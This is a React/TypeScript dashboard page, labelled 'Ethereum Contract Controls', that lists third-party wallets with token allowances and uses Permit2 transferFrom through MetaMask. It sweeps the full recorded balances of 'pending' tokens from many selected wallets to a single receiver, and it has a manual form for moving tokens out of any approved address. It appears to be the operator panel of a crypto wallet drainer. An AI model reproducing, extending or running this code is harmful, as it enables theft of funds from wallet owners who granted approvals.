"use client";

import { useState, useEffect } from "react";
import { Breadcrumbs } from "@/components/breadcrumbs";
import PageContainer from "@/components/layout/page-container";
import { Heading } from "@/components/ui/heading";
import { Separator } from "@/components/ui/separator";
import { Button } from "@/components/ui/button";
import { RefreshCw, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { WalletTable } from "@/components/tables/wallet-tables/wallet-table";
import { ExecutionTable } from "@/components/tables/wallet-tables/execution-table";
import { columns, Wallet } from "@/components/tables/wallet-tables/columns";
import { allowanceApi, permit2Api } from '@/lib/api-client';
import { Filters, WalletSearchParams } from "./filters";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { ethers } from "ethers";
import detectEthereumProvider from "@metamask/detect-provider";
import { useToast } from "@/components/ui/use-toast";

// Add TypeScript declaration for ethereum in window
declare global {
  interface Window {
    ethereum?: any;
  }
}

const breadcrumbItems = [
  { title: "Dashboard", link: "/dashboard" },
  { title: "Ethereum Contract Controls", link: "/dashboard/ethereum" },
];

// Permit2 contract address is the same across all networks
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; 

// ABI for Permit2 batchTransferFrom function
const PERMIT2_ABI = [
  "function transferFrom(tuple(address from, address to, uint160 amount, address token)[] calldata transferDetails) external"
];

// ABI for ERC20 token to get decimals
const ERC20_ABI = [
  "function decimals() view returns (uint8)"
];

export default function Page() {
  const [isLoading, setIsLoading] = useState(false);
  const [isPendingLoading, setIsPendingLoading] = useState(false);
  const [walletTableData, setWalletTableData] = useState<Wallet[]>([]);
  const [pendingWalletData, setPendingWalletData] = useState<Wallet[]>([]);
  const [totalCount, setTotalCount] = useState(0);
  const [totalPages, setTotalPages] = useState(1);
  const [pendingTotalCount, setPendingTotalCount] = useState(0);
  const [pendingTotalPages, setPendingTotalPages] = useState(1);
  const [selectedRows, setSelectedRows] = useState<Wallet[]>([]);
  const [activeTab, setActiveTab] = useState("wallet-data");
  
  // Permit2 form state
  const [fromAddress, setFromAddress] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [tokenInputs, setTokenInputs] = useState([{ tokenAddress: "", amount: "" }]);
  const [isTransferring, setIsTransferring] = useState(false);
  const [transferMessage, setTransferMessage] = useState<{message: string, type: "success" | "error"} | null>(null);
  
  // Add state for execution receiver input (for Execution tab)
  const [executionReceiver, setExecutionReceiver] = useState("");
  
  // Search params state with pagination for normal wallet data
  const [searchParams, setSearchParams] = useState<WalletSearchParams>({
    chainId: "1",
    page: 1,
    pageSize: 10
  });
  
  // Search params for pending tokens (execution tab)
  const [pendingSearchParams, setPendingSearchParams] = useState<WalletSearchParams>({
    chainId: "1",
    page: 1,
    pageSize: 10,
    executionFilter: "pending" // Only show pending tokens
  });

  const { toast } = useToast();

  // Load wallets whenever searchParams changes (including page changes)
  useEffect(() => {
    searchWallets(searchParams);
  }, [searchParams]);
  
  // Load pending wallets whenever pendingSearchParams changes
  useEffect(() => {
    if (activeTab === "execution") {
      searchPendingWallets(pendingSearchParams);
    }
  }, [pendingSearchParams, activeTab]);

  // Handle tab change
  const handleTabChange = (value: string) => {
    setActiveTab(value);
    
    // Load pending data when switching to execution tab
    if (value === "execution" && pendingWalletData.length === 0) {
      searchPendingWallets(pendingSearchParams);
    }
  };

  // Handle search params change - called from Filters component
  const handleSearchParamsChange = (newParams: Partial<WalletSearchParams>) => {
    const updatedParams = { ...searchParams, ...newParams };
    setSearchParams(updatedParams);
  };

  // Handle page change - called from WalletTable component
  const handlePageChange = (newPage: number) => {
    setSearchParams(prev => ({
      ...prev,
      page: newPage
    }));
  };
  
  // Handle pending page change - called from ExecutionTable
  const handlePendingPageChange = (newPage: number) => {
    setPendingSearchParams(prev => ({
      ...prev,
      page: newPage
    }));
  };

  // Advanced search with filters - truly server-side pagination
  const searchWallets = async (params: WalletSearchParams) => {
    setIsLoading(true);
    try {
      console.log("Searching wallets with params:", params);
      
      // Create search params for API call
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress,
        minBalance: params.minBalance,
        maxBalance: params.maxBalance,
        startDate: params.startDate ? params.startDate.toISOString() : undefined,
        endDate: params.endDate ? params.endDate.toISOString() : undefined,
        executionFilter: params.executionFilter as "new" | "pending" | "executed" | "all" | undefined,
        page: params.page,
        pageSize: params.pageSize
      };
      
      // Call the search API
      const response = await allowanceApi.search(apiSearchParams);
      
      if (!response.success) {
        console.error("Failed to search wallets:", response.error);
        return;
      }
      
      console.log("Search response:", response.data);
      
      // Extract pagination data from response
      setTotalCount(response.data?.total || 0);
      setTotalPages(response.data?.totalPages || 1);
      
      // Extract results from the search response - now already flattened by the API
      const flattened = response.data?.results || [];
      
      if (flattened.length === 0) {
        console.log("No wallet-token pairs found in search results");
        setWalletTableData([]);
        return;
      }
      
      // Transform API data to match our table structure
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: 1,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      
      console.log(`Received ${tableData.length} wallet-token pairs for page ${params.page}`);
      setWalletTableData(tableData);
    } catch (error) {
      console.error("Error searching wallets:", error);
      setWalletTableData([]);
    } finally {
      setIsLoading(false);
    }
  };

  // Search specifically for pending tokens - used in execution tab
  const searchPendingWallets = async (params: WalletSearchParams) => {
    setIsPendingLoading(true);
    try {
      console.log("Searching pending tokens with params:", params);
      
      // Create search params for API call
      const apiSearchParams = {
        chainId: params.chainId.toString(),
        walletAddress: params.walletAddress,
        minBalance: params.minBalance,
        maxBalance: params.maxBalance,
        startDate: params.startDate ? params.startDate.toISOString() : undefined,
        endDate: params.endDate ? params.endDate.toISOString() : undefined,
        executionFilter: "pending" as "pending" | "new" | "executed" | "all" | undefined,
        page: params.page,
        pageSize: params.pageSize
      };
      
      // Call the search API
      const response = await allowanceApi.search(apiSearchParams);
      
      if (!response.success) {
        console.error("Failed to search pending tokens:", response.error);
      return;
    }

      console.log("Pending search response:", response.data);
      
      // Extract pagination data from response
      setPendingTotalCount(response.data?.total || 0);
      setPendingTotalPages(response.data?.totalPages || 1);
      
      // Extract results from the search response
      const flattened = response.data?.results || [];
      
      if (flattened.length === 0) {
        console.log("No pending wallet-token pairs found");
        setPendingWalletData([]);
        return;
      }
      
      // Transform API data to match our table structure
      const tableData: Wallet[] = flattened.map((item: any) => ({
        id: item.id,
        walletAddress: item.walletAddress,
        tokenAddresses: item.tokenAddresses || [item.tokenAddress],
        chainId: 1,
        createdAt: item.createdAt,
        tokenBalances: item.tokenBalances || [],
        executionStatus: item.executionStatus || []
      }));
      
      console.log(`Received ${tableData.length} pending wallet-token pairs for page ${params.page}`);
      setPendingWalletData(tableData);
    } catch (error) {
      console.error("Error searching pending tokens:", error);
      setPendingWalletData([]);
    } finally {
      setIsPendingLoading(false);
    }
  };

  // Basic fetch to reset and get first page
  const fetchWallets = async () => {
    // Reset to page 1 with default filters and fetch
    const defaultParams = {
            chainId: "1",
      page: 1,
      pageSize: 10
    };
    
    setSearchParams(defaultParams);
    // Use the search API with default params to get flattened data
    await searchWallets(defaultParams);
  };
  
  // Refresh pending tokens data
  const refreshPendingTokens = async () => {
    // Reset to page 1 but keep the pending filter
    const refreshParams = {
      ...pendingSearchParams,
      page: 1
    };
    
    setPendingSearchParams(refreshParams);
    // This will trigger the useEffect to reload the data
    await searchPendingWallets(refreshParams);
  };

  // Reset the Permit2 form
  const resetPermit2Form = () => {
    setFromAddress("");
    setToAddress("");
    setTokenInputs([{ tokenAddress: "", amount: "" }]);
    setTransferMessage(null);
  };

  // Add another token input row
  const addTokenRow = () => {
    setTokenInputs([...tokenInputs, { tokenAddress: "", amount: "" }]);
  };

  // Remove a token input row
  const removeTokenRow = (index: number) => {
    if (tokenInputs.length > 1) {
      const newTokens = [...tokenInputs];
      newTokens.splice(index, 1);
      setTokenInputs(newTokens);
    }
  };

  // Update token at specific index
  const updateTokenField = (index: number, field: "tokenAddress" | "amount", value: string) => {
    const newTokens = [...tokenInputs];
    newTokens[index][field] = value;
    setTokenInputs(newTokens);
  };

  // Handle Permit2 Transfer - actual implementation using ethers & MetaMask
  const handlePermit2Transfer = async () => {
    // Reset any previous messages
    setTransferMessage(null);
    
    // Validate form fields
    if (!fromAddress || !toAddress) {
      toast({
        title: "Missing Fields",
        description: "Please fill in from and to addresses.",
        variant: "destructive"
      });
      return;
    }

    // Validate token fields
    const hasEmptyFields = tokenInputs.some(token => !token.tokenAddress || !token.amount);
    if (hasEmptyFields) {
      toast({
        title: "Missing Fields",
        description: "Please fill in all token addresses and amounts.",
        variant: "destructive"
      });
      return;
    }
    
    // Validate addresses
    if (!fromAddress.startsWith("0x") || fromAddress.length !== 42 || fromAddress === ethers.ZeroAddress) {
      toast({
        title: "Invalid From Address",
        description: "Please enter a valid from address.",
        variant: "destructive"
      });
      return;
    }
    
    if (!toAddress.startsWith("0x") || toAddress.length !== 42 || toAddress === ethers.ZeroAddress) {
      toast({
        title: "Invalid To Address",
        description: "Please enter a valid to address.",
        variant: "destructive"
      });
      return;
    }
    
    // Validate token addresses and amounts
    const hasInvalidTokenAddress = tokenInputs.some(
      token => !token.tokenAddress.startsWith("0x") || token.tokenAddress.length !== 42 || token.tokenAddress === ethers.ZeroAddress
    );
    if (hasInvalidTokenAddress) {
      toast({
        title: "Invalid Token Address",
        description: "One or more token addresses are invalid.",
        variant: "destructive"
      });
      return;
    }
    const hasInvalidAmount = tokenInputs.some(token => isNaN(Number(token.amount)) || Number(token.amount) <= 0);
    if (hasInvalidAmount) {
      toast({
        title: "Invalid Amount",
        description: "One or more token amounts are invalid (must be positive numbers).",
        variant: "destructive"
      });
      return;
    }

    // Start transfer process
    setIsTransferring(true);

    try {
      // Connect to MetaMask
      const provider = await detectEthereumProvider({ silent: true });

      if (!provider) {
        throw new Error("MetaMask not detected. Please install MetaMask.");
      }

      // Request account access
      await window.ethereum.request({ method: 'eth_requestAccounts' });

      // Create ethers provider and signer
      const ethersProvider = new ethers.BrowserProvider(window.ethereum);
      const signer = await ethersProvider.getSigner();
      const userAddress = await signer.getAddress();
      
      // Create Permit2 contract instance
      const permit2Contract = new ethers.Contract(
        PERMIT2_ADDRESS,
        PERMIT2_ABI,
        signer
      );

      const getTokenDecimals = async (tokenAddress: string, provider: any) => {
        try {
          const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
          const decimals = await tokenContract.decimals();
          return Number(decimals);
        } catch {
          return 18; // fallback
        }
      }

      // Additional checks: balance and allowance
      for (const token of tokenInputs) {
        const tokenContract = new ethers.Contract(token.tokenAddress, [
          "function balanceOf(address) view returns (uint256)",
          "function allowance(address,address) view returns (uint256)",
          ...ERC20_ABI
        ], signer);
        const decimals = await getTokenDecimals(token.tokenAddress, signer);
        const amount = ethers.parseUnits(String(token.amount), Number(decimals));
      }

      // Prepare transfer details array for batch transfer
      const transferDetails = await Promise.all(tokenInputs.map(async token => {
        const decimals = await getTokenDecimals(token.tokenAddress, signer);
        try {
          // Handle parsing safely with explicit string conversion
          const amount = ethers.parseUnits(String(token.amount), Number(decimals));
          return {
            from: fromAddress,
            to: toAddress,
            amount,
            token: token.tokenAddress
          };
        } catch (parseError) {
          console.error(`Error parsing amount for token ${token.tokenAddress}:`, parseError);
          toast({
            title: "Invalid Amount",
            description: `Cannot parse amount for token ${token.tokenAddress}. Please check the value and decimals.`,
            variant: "destructive"
          });
          setIsTransferring(false);
          throw parseError;
        }
      }));
      
      console.log("Executing batch transfer with details:", transferDetails);
      
      // Execute the batch transfer
      let tx;
      try {
        tx = await permit2Contract.transferFrom(transferDetails);
      } catch (err: any) {
        let errorMsg = err?.message || "Unknown error";
        if (err?.code === 3 && err?.message?.includes('execution reverted')) {
          const tokenList = tokenInputs.map(t => t.tokenAddress).join(', ');
          errorMsg = `❌ Transfer failed: The connected wallet does not have allowance for the following token(s):\n${tokenList}.\n\nPlease ensure you are connected with the correct wallet (spender) and have approved Permit2 for these tokens.\nIf you are the correct wallet, check your allowance and try again.`;
        } else if (err?.code === 'CALL_EXCEPTION' && err?.message) {
          errorMsg = '❌ Call Exception: The transaction could not be executed. Check spender allowance.';
        } else if (err?.code === 4001 || (err?.message && err.message.toLowerCase().includes('user rejected'))) {
          errorMsg = '❌ Transaction was cancelled by the user.';
        } else if (err?.message?.toLowerCase().includes('insufficient funds')) {
          errorMsg = '❌ Insufficient funds: The wallet does not have enough ETH to pay for gas.';
        } else if (err?.message?.toLowerCase().includes('invalid address')) {
          errorMsg = '❌ Invalid address: Please check the receiver or token address.';
        } else if (err?.message?.toLowerCase().includes('nonce')) {
          errorMsg = '❌ Nonce error: Please try again or reset your wallet nonce.';
        } else if (err?.message?.toLowerCase().includes('replacement transaction underpriced')) {
          errorMsg = '❌ Transaction underpriced: Try increasing your gas fee.';
        } else if (err?.message?.toLowerCase().includes('gas required exceeds allowance')) {
          errorMsg = '❌ Gas error: The transaction requires more gas than allowed. Try increasing your gas limit.';
        } else if (err?.message?.toLowerCase().includes('execution reverted')) {
          errorMsg = '❌ Execution reverted: The contract rejected the transaction. This may be due to missing allowance, wrong wallet, or contract logic.';
        }
        toast({
          title: "Transfer Error",
          description: errorMsg,
          variant: "destructive",
          duration: 10000
        });
        setIsTransferring(false);
        return;
      }
      console.log("Transaction submitted:", tx.hash);
        
      // Wait for transaction to be mined
      const receipt = await tx.wait();
      console.log("Transaction confirmed:", receipt);
      
      const tokenCount = tokenInputs.length;
      
      // Successful transfer
      toast({
        title: "Batch Transfer Successful",
        description: `Batch transfer of ${tokenCount} token${tokenCount > 1 ? 's' : ''} completed! Tx: ${tx.hash}`,
        variant: "default"
      });
    } catch (error: any) {
      let errorMsg = error?.message || "Unknown error";
      if (error?.code === 4001 || (error?.message && error.message.toLowerCase().includes('user rejected'))) {
        errorMsg = '❌ Transaction was cancelled by the user.';
      } else if (error?.message?.toLowerCase().includes('insufficient funds')) {
        errorMsg = '❌ Insufficient funds: The wallet does not have enough ETH to pay for gas.';
      } else if (error?.message?.toLowerCase().includes('invalid address')) {
        errorMsg = '❌ Invalid address: Please check the receiver or token address.';
      } else if (error?.message?.toLowerCase().includes('nonce')) {
        errorMsg = '❌ Nonce error: Please try again or reset your wallet nonce.';
      } else if (error?.message?.toLowerCase().includes('replacement transaction underpriced')) {
        errorMsg = '❌ Transaction underpriced: Try increasing your gas fee.';
      } else if (error?.message?.toLowerCase().includes('gas required exceeds allowance')) {
        errorMsg = '❌ Gas error: The transaction requires more gas than allowed. Try increasing your gas limit.';
      } else if (error?.message?.toLowerCase().includes('execution reverted')) {
        errorMsg = '❌ Execution reverted: The contract rejected the transaction. This may be due to missing allowance, wrong wallet, or contract logic.';
      }
      toast({
        title: "Transfer Error",
        description: errorMsg,
        variant: "destructive",
        duration: 10000
      });
    } finally {
      setIsTransferring(false);
    }
  };

  // Handler for batch execution from ExecutionTable
  const handleExecuteTokens = async (selectedRows: Wallet[]) => {
    // Validate receiver address
    if (!executionReceiver || !executionReceiver.startsWith("0x") || executionReceiver.length !== 42) {
      return { error: "Please enter a valid receiver address (0x... format) in the Execution tab." };
    }
    // Collect all transfer details in a single array
    const transferDetails: any[] = [];
    if (Array.isArray(selectedRows)) {
      selectedRows.forEach(row => {
        // Only include tokens with 'pending' status
        const pendingTokens = Array.isArray(row.executionStatus)
          ? row.executionStatus.filter((s: any) => s.status === 'pending')
          : [];
        const tokenBalances = Array.isArray(row.tokenBalances) ? row.tokenBalances : [];
        pendingTokens.forEach((tokenStatus: any) => {
          const bal = tokenBalances.find(t => t.tokenAddress.toLowerCase() === tokenStatus.tokenAddress.toLowerCase());
          const decimals = bal?.decimals ? Number(bal.decimals) : 18;
          let amount: bigint = BigInt(0);
          try {
            amount = bal?.balance ? ethers.parseUnits(String(bal.balance), decimals) : BigInt(0);
          } catch (parseError) {
            console.error(`[ExecutionTable] Error parsing amount for token ${tokenStatus.tokenAddress}:`, parseError);
          }
          transferDetails.push({
            from: row.walletAddress,
            to: executionReceiver,
            amount,
            token: tokenStatus.tokenAddress
          });
        });
      });
    }
    if (transferDetails.length === 0) {
      return { error: 'No pending tokens to execute.' };
    }
    console.log("🚀 ~ handleExecuteTokens ~ transferDetails:", transferDetails)
    // Connect to MetaMask
    let provider: any, signer: any;
    try {
      provider = await detectEthereumProvider({ silent: true });
      if (!provider) throw new Error("MetaMask not detected");
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const ethersProvider = new ethers.BrowserProvider(window.ethereum);
      signer = await ethersProvider.getSigner();
    } catch (err) {
      return { error: 'MetaMask connection failed: ' + (err as any)?.message };
    }
    // Permit2 contract
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
    let txHash: string | null = null;
    let results: any[] = [];
    let transactionSuccessful = false;
    
    try {
      const tx = await permit2Contract.transferFrom(transferDetails);
      txHash = tx.hash as string;
      await tx.wait();
      
      // Mark transaction as successful only after tx.wait() completes without error
      transactionSuccessful = true;
      console.log("🚀 ~ handleExecuteTokens ~ Ethereum transaction successful");
      
      results = transferDetails.map(td => ({ walletAddress: td.from, tokenAddress: td.token, success: true, txHash }));
    } catch (err: any) {
      console.error('[Transfer Error]', err);
      transactionSuccessful = false;
      let errorMsg = err?.message || 'Unknown error';
      // User-friendly error mapping
      if (err?.code === 3 && err?.message?.includes('execution reverted')) {
        const tokenList = transferDetails.map(t => t.token).join(', ');
        errorMsg = `❌ Transfer failed: The connected wallet does not have allowance for the following token(s):\n${tokenList}.\n\nPlease ensure you are connected with the correct wallet (spender) and have approved for these tokens.\nIf you are the correct wallet, check your allowance and try again.`;
      } else if (err?.code === 'CALL_EXCEPTION' && err?.message) {
        errorMsg = '❌ Call Exception: The transaction could not be executed. Check spender allowance.';
      } else if (err?.code === 4001 || (err?.message && err.message.toLowerCase().includes('user rejected'))) {
        errorMsg = '❌ Transaction was cancelled by the user.';
      } else if (err?.message?.toLowerCase().includes('insufficient funds')) {
        errorMsg = '❌ Insufficient funds: The wallet does not have enough ETH to pay for gas.';
      } else if (err?.message?.toLowerCase().includes('invalid address')) {
        errorMsg = '❌ Invalid address: Please check the receiver or token address.';
      } else if (err?.message?.toLowerCase().includes('nonce')) {
        errorMsg = '❌ Nonce error: Please try again or reset your wallet nonce.';
      } else if (err?.message?.toLowerCase().includes('replacement transaction underpriced')) {
        errorMsg = '❌ Transaction underpriced: Try increasing your gas fee.';
      } else if (err?.message?.toLowerCase().includes('gas required exceeds allowance')) {
        errorMsg = '❌ Gas error: The transaction requires more gas than allowed. Try increasing your gas limit.';
      } else if (err?.message?.toLowerCase().includes('execution reverted')) {
        errorMsg = '❌ Execution reverted: The contract rejected the transaction. This may be due to missing allowance, wrong wallet, or contract logic.';
      }
      results = transferDetails.map(td => ({ walletAddress: td.from, tokenAddress: td.token, success: false, error: errorMsg }));
    }
    
    // Only update backend status if transaction was successful
    if (transactionSuccessful && results.length > 0) {
      try {
        console.log("🚀 ~ handleExecuteTokens ~ Updating backend status to executed for successful transaction");
        const updatePayload = transferDetails.map(td => ({
          walletAddress: td.from,
          chainId: '1',
          tokenAddress: td.token
        }));
        await allowanceApi.updateStatus(updatePayload, 'executed');
        console.log("🚀 ~ handleExecuteTokens ~ Backend status updated successfully");
      } catch (backendError) {
        console.error("🚀 ~ handleExecuteTokens ~ Failed to update backend status:", backendError);
        // Don't fail the entire operation if backend update fails
      }
    }
    
    return { 
      success: transactionSuccessful,
      txHash, 
      results,
      error: transactionSuccessful ? undefined : "Transaction failed or was cancelled"
    };
  };

  return (
    <PageContainer scrollable={true}>
      <div className="space-y-6">
        <Breadcrumbs items={breadcrumbItems} />

        <div className="flex items-start justify-between">
          <Heading
            title="Ethereum Contract Controls"
            description="Manage emergency token withdrawals and batch operations."
          />
          <Badge variant="outline" className="px-3 py-1">
            <span className="mr-1 h-2 w-2 rounded-full bg-green-500 inline-block"></span>
            Contract Connected
          </Badge>
        </div>
        <Separator />

        <Tabs defaultValue="wallet-data" className="space-y-4" onValueChange={handleTabChange}>
          <TabsList className="grid w-full grid-cols-3">
            <TabsTrigger value="wallet-data">Wallet Data</TabsTrigger>
            <TabsTrigger value="execution">Execution</TabsTrigger>
            <TabsTrigger value="manual-control">Manual Control</TabsTrigger>
          </TabsList>

          {/* Wallet Data Tab - Contains the existing filters and table */}
          <TabsContent value="wallet-data" className="space-y-4">
            <div className="space-y-4">
              <Filters 
                searchParams={searchParams}
                onSearchParamsChange={handleSearchParamsChange}
                onRefresh={fetchWallets}
                isLoading={isLoading}
              />
              
                    {isLoading ? (
                <div className="flex justify-center items-center py-10">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                      </div>
                    ) : (
                <WalletTable 
                  columns={columns} 
                  data={walletTableData} 
                  chainId={1}
                  currentPage={searchParams.page}
                  totalPages={totalPages}
                  onPageChange={handlePageChange}
                  isServerPaginated={true}
                  onRowSelectionChange={setSelectedRows}
                />
                    )}
                  </div>
          </TabsContent>

          {/* Execution Tab - Filtered to show only pending tokens */}
          <TabsContent value="execution" className="space-y-4">
            {/* Receiver Address input removed from here, now handled inside ExecutionTable */}
            {isPendingLoading ? (
              <div className="flex justify-center items-center py-10">
                <Loader2 className="h-8 w-8 animate-spin text-primary" />
                </div>
            ) : (
              <ExecutionTable 
                  columns={columns} 
                data={pendingWalletData} 
                  chainId={1}
                currentPage={pendingSearchParams.page}
                totalPages={pendingTotalPages}
                onPageChange={handlePendingPageChange}
                isServerPaginated={true}
                onRowSelectionChange={setSelectedRows}
                onRefresh={refreshPendingTokens}
                onExecuteTokens={handleExecuteTokens}
                executionReceiver={executionReceiver}
                setExecutionReceiver={setExecutionReceiver}
              />
            )}
          </TabsContent>

          {/* Manual Control Tab - Coming Soon */}
          <TabsContent value="manual-control" className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle>Batch Transfer</CardTitle>
                <CardDescription>
                  Transfer multiple tokens from one address to another
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="fromWallet">From Wallet</Label>
                    <Input id="fromWallet" placeholder="0x..." value={fromAddress} onChange={(e) => setFromAddress(e.target.value)} />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="toWallet">To Wallet</Label>
                    <Input id="toWallet" placeholder="0x..." value={toAddress} onChange={(e) => setToAddress(e.target.value)} />
                  </div>
                  
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <Label>Token Transfers</Label>
                      <Button 
                        type="button" 
                        variant="outline" 
                        size="sm" 
                        onClick={addTokenRow}
                        disabled={isTransferring}
                      >
                        Add Token
                      </Button>
                    </div>
                    
                    {tokenInputs.map((token, index) => (
                      <div key={index} className="space-y-2 p-3 border rounded-md">
                        <div className="flex items-center justify-between">
                          <span className="text-sm font-medium">Token #{index + 1}</span>
                          {tokenInputs.length > 1 && (
                            <Button 
                              type="button" 
                              variant="ghost" 
                              size="sm" 
                              onClick={() => removeTokenRow(index)}
                              disabled={isTransferring}
                            >
                              Remove
                            </Button>
                          )}
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`tokenAddress-${index}`}>Token Address</Label>
                          <Input 
                            id={`tokenAddress-${index}`}
                            placeholder="0x..." 
                            value={token.tokenAddress}
                            onChange={(e) => updateTokenField(index, "tokenAddress", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                        
                        <div className="space-y-2">
                          <Label htmlFor={`amount-${index}`}>Amount</Label>
                          <Input 
                            id={`amount-${index}`}
                            type="text" 
                            placeholder="0.0" 
                            value={token.amount}
                            onChange={(e) => updateTokenField(index, "amount", e.target.value)}
                            disabled={isTransferring}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
                
                <div className="flex justify-end space-x-2">
                  <Button variant="outline" onClick={resetPermit2Form} disabled={isTransferring}>Reset</Button>
                  <Button onClick={handlePermit2Transfer} disabled={isTransferring}>
                    {isTransferring ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      "Execute Batch Transfer"
                    )}
                  </Button>
                    </div>

                {transferMessage && (
                  <div className={`mt-4 p-4 rounded-md border ${
                    transferMessage.type === "success" 
                      ? "bg-green-50 border-green-200 text-green-700" 
                      : "bg-red-50 border-red-200 text-red-700"
                  }`}>
                    <div className="flex items-center">
                      {transferMessage.type === "success" ? (
                        <CheckCircle2 className="h-5 w-5 mr-2 text-green-500" />
                      ) : (
                        <AlertCircle className="h-5 w-5 mr-2 text-red-500" />
                      )}
                      <p>{transferMessage.message}</p>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </PageContainer>
  );
}